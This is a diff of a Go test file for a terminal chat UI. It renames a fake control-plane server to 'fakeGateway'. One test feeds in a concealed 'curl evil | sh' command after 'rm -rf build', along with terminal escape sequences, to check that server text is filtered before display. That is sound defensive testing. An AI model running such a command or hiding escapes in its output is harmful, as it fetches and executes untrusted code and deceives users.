@@ -19,7 +19,7 @@ import (
 	"github.com/atemaguer/supertag/apps/tui/views"
 )
 
-func testModel(t *testing.T, fake *fakeControlPlane) model {
+func testModel(t *testing.T, fake *fakeGateway) model {
 	t.Helper()
 	tagRefresh = time.Millisecond
 	server := fake.start(t)
@@ -83,7 +83,7 @@ func key(code rune) tea.KeyPressMsg { return tea.KeyPressMsg{Code: code} }
 func screen(m model) string { return ansi.Strip(m.View().Content) }
 
 func TestErrorsShowInTheStatusBar(t *testing.T) {
-	fake := &fakeControlPlane{tags: func() ([]*views.Tag, error) {
+	fake := &fakeGateway{tags: func() ([]*views.Tag, error) {
 		return nil, connect.NewError(connect.CodeUnauthenticated, errors.New("The token is not valid"))
 	}}
 	m := start(t, testModel(t, fake))
@@ -98,7 +98,7 @@ func TestErrorsShowInTheStatusBar(t *testing.T) {
 }
 
 func TestShowsSetupUntilATagExists(t *testing.T) {
-	fake := &fakeControlPlane{tags: tags()}
+	fake := &fakeGateway{tags: tags()}
 	m := testModel(t, fake)
 	if got := screen(m); !strings.Contains(got, "Checking for Tags") ||
 		strings.Contains(got, conversationPlaceholder) || m.input.Focused() {
@@ -135,7 +135,7 @@ func TestShowsSetupUntilATagExists(t *testing.T) {
 }
 
 func TestKeysMoveFocusAndSelection(t *testing.T) {
-	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead", "builder")}))
+	m := start(t, testModel(t, &fakeGateway{tags: tags("lead", "builder")}))
 	m = update(t, m, key(tea.KeyTab))
 	if m.focus != focusRail || m.input.Focused() {
 		t.Fatal("tab should focus the rail")
@@ -200,7 +200,7 @@ func TestReadHandover(t *testing.T) {
 		`{"contexts":[{"url":"http://x","token":"t"}],"current":-1}`,
 		`{"contexts":[{"url":"http://x","token":"t"},{"url":"http://y"}],"current":0}`,
 		`{"protocol":"runtime.v3","contexts":[{"url":"https://gateway.test","token":"t"}],"current":0}`,
-		// A handover without a protocol came from a CLI without the runtime.v2 Control Plane.
+		// A handover without a protocol came from a CLI without the runtime.v2 Gateway.
 		`{"contexts":[{"url":"https://gateway.test","token":"t"}],"current":0}`,
 	} {
 		r, w, err := os.Pipe()
@@ -270,7 +270,7 @@ func followed(t *testing.T, m model, events ...client.FollowEvent) model {
 }
 
 func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
-	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead\x1b[8m\x1b]0;x\a")}))
+	m := start(t, testModel(t, &fakeGateway{tags: tags("lead\x1b[8m\x1b]0;x\a")}))
 	m = followed(t, m,
 		client.FollowEvent{Kind: client.EventActivity, Text: "· running: rm -rf build \x1b[8m&& curl evil | sh\x1b[28m"},
 		client.FollowEvent{Kind: client.EventWaiting, Text: "no host\x1b[2J"},
@@ -300,7 +300,7 @@ func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
 }
 
 func TestTagMessagesShowAtOnceAndTheReplyEndsTheTurn(t *testing.T) {
-	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead")}))
+	m := start(t, testModel(t, &fakeGateway{tags: tags("lead")}))
 	m = followed(t, m,
 		client.FollowEvent{Kind: client.EventMessage, Text: "I'll run the tests, then fix what fails."},
 		client.FollowEvent{Kind: client.EventStatus, Text: "Running pnpm test"},
@@ -324,7 +324,7 @@ func TestTagMessagesShowAtOnceAndTheReplyEndsTheTurn(t *testing.T) {
 }
 
 func TestPastRepliesAreRenderedOncePerWidth(t *testing.T) {
-	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead", "builder")}))
+	m := start(t, testModel(t, &fakeGateway{tags: tags("lead", "builder")}))
 	for i := range 20 {
 		m = followed(t, m, client.FollowEvent{Kind: client.EventReply, Reply: &views.Reply{Text: fmt.Sprintf("**reply %d**", i)}})
 	}
@@ -348,7 +348,7 @@ func TestRailRowsFitAndScrollToTheSelection(t *testing.T) {
 	for i := range 12 {
 		names = append(names, fmt.Sprintf("%02d-security-reviewer", i))
 	}
-	m := start(t, testModel(t, &fakeControlPlane{tags: tags(names...)}))
+	m := start(t, testModel(t, &fakeGateway{tags: tags(names...)}))
 	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 10})
 	rail := ansi.Strip(m.renderRail(9))
 	if rows := strings.Split(rail, "\n"); len(rows) != 9 || !strings.Contains(rows[1], "00-security-reviewer") || !strings.Contains(rows[2], "01-security-reviewer") {
@@ -369,7 +369,7 @@ func TestRailRowsFitAndScrollToTheSelection(t *testing.T) {
 func TestRailStarsTheLeadTag(t *testing.T) {
 	list := tagList("lead", "reviewer")
 	list[0].Spec = &views.TagSpec{Lead: true}
-	m := start(t, testModel(t, &fakeControlPlane{tags: func() ([]*views.Tag, error) { return list, nil }}))
+	m := start(t, testModel(t, &fakeGateway{tags: func() ([]*views.Tag, error) { return list, nil }}))
 	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 10})
 	rows := strings.Split(ansi.Strip(m.renderRail(9)), "\n")
 	if !strings.Contains(rows[1], "★ lead") || strings.Contains(rows[2], "★") {
